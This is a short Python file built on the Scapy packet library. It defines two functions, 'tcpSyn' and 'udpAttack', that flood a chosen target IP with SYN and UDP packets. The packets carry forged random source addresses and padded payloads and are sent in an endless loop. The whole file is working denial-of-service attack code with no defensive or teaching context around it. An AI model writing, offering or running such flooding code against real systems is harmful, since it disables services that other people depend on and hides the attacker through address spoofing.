from scapy.all import *

def tcpSyn(ip_address,dport):
    tcpPacket = IP(src = RandIP(),dst = ip_address)/TCP(sport = RandShort(),dport = dport,flags = 'S')/Raw(b"AB"*512)
    send(tcpPacket,loop=1)

def udpAttack(ip_address,dport):
    udpPacket = IP(src = RandIP(),dst = ip_address)/UDP(sport = RandShort(),dport = RandShort())/Raw(b"AB"*512)
    send(udpPacket,loop=1)
